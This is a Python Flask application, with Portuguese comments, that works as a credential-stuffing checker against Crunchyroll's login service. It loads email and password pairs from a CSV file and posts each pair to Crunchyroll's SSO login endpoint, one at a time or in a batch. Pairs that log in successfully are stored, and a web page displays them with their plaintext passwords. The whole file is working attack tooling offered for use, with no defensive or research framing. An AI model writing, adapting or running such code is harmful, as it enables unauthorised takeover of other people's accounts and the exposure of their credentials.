from flask import Flask, request, jsonify, render_template_string
import pandas as pd
import requests
import os

app = Flask(__name__)

# Carregar dados do CSV (ajuste o caminho se necessário)
csv_file = os.path.join(os.path.dirname(__file__), '..', 'dados2.csv')
tabela = pd.read_csv(csv_file)

login_url = 'https://sso.crunchyroll.com/pt-br/login?return_url=%2Fauthorize%3Fclient_id%3Dnoaihdevm_6iyg0a8l0q%26redirect_uri%3Dhttps%3A%2F%2Fwww.crunchyroll.com%2Fcallback%26response_type%3Dcookie%26state%3D%252F'

contas_validas = []

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    email = data.get('email')
    senha = data.get('senha')
    
    response = requests.post(login_url, data={'email': email, 'password': senha})
    
    if response.ok and response.url != login_url:
        contas_validas.append({'email': email, 'senha': senha})
        return jsonify({"status": "sucesso", "email": email})
    else:
        return jsonify({"error": "Falha no login"}), 401

@app.route('/login/batch', methods=['POST'])
def batch_login():
    resultados = []
    
    for _, row in tabela.iterrows():
        email = row['email']
        senha = str(row['senha'])
        
        response = requests.post(login_url, data={'email': email, 'password': senha})
        
        if response.ok and response.url != login_url:
            contas_validas.append({'email': email, 'senha': senha})
            resultados.append({"email": email, "status": "sucesso"})
        else:
            resultados.append({"email": email, "status": "falha"})
    
    return jsonify({"resultados": resultados})

@app.route('/contas_validas', methods=['GET'])
def exibir_contas_validas():
    html_template = """
    <!DOCTYPE html>
    <html lang="pt-br">
    <head>
        <meta charset="UTF-8">
        <title>Contas Válidas</title>
    </head>
    <body>
        <h1>Contas com Login Bem-sucedido</h1>
        {% if contas %}
            <table border="1">
                <tr>
                    <th>Email</th>
                    <th>Senha</th>
                </tr>
                {% for conta in contas %}
                <tr>
                    <td>{{ conta.email }}</td>
                    <td>{{ conta.senha }}</td>
                </tr>
                {% endfor %}
            </table>
        {% else %}
            <p>Nenhuma conta válida encontrada.</p>
        {% endif %}
    </body>
    </html>
    """
    return render_template_string(html_template, contas=contas_validas)

# Para uso em plataformas que exigem main
if __name__ == "__main__":
    app.run()

